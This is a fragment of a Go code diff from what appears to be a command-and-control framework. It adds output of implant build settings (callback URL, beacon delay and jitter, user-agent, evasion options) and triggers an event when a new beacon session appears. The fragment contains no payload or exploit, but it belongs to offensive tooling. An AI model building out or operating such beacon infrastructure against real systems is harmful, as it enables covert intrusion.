+	fmt.Printf("    OS: %s\n", build.OS)
+	fmt.Printf("    Arch: %s\n", build.Arch)
+	fmt.Printf("    Callback URL: %s\n", build.CallbackURL)
+	fmt.Printf("    Delay: %d seconds\n", build.Delay)
+	fmt.Printf("    Jitter: %.2f\n", build.Jitter)
+	fmt.Printf("    User-Agent: %s\n", build.UserAgent)
+	fmt.Printf("    Protocol: %s\n", build.Protocol)
+	fmt.Printf("    Output Path: %s\n", build.OutputPath)
+	fmt.Printf("    Size: %d bytes\n", build.Size)
+	fmt.Printf("    Created: %s\n", time.Unix(build.CreatedAt, 0).Format("2006-01-02 15:04:05"))
+	if build.Modules != "" {
+		fmt.Printf("    Modules: %s\n", build.Modules)
+	}
+	if build.Evasion != "" {
+		fmt.Printf("    Evasion: %s\n", build.Evasion)
+	}
+
 	return nil
 }
 
@@ -587,6 +1529,13 @@ func (is *InteractiveServer) syncSessions() {
 				// Note: Session struct fields may not be directly settable
 				// This is a simplified sync - full implementation would need proper setters
 				is.sessionMgr.AddSession(session)
+				
+				// Trigger reaction manager for new session
+				is.reactionMgr.TriggerEvent(reactions.EventTypeSessionNew, map[string]interface{}{
+					"session_id": id,
+					"type":        "beacon",
+					"transport":    "http",
+				})
 			} else {
 				// Update last seen
 				if session, ok := is.sessionMgr.GetSession(id); ok {
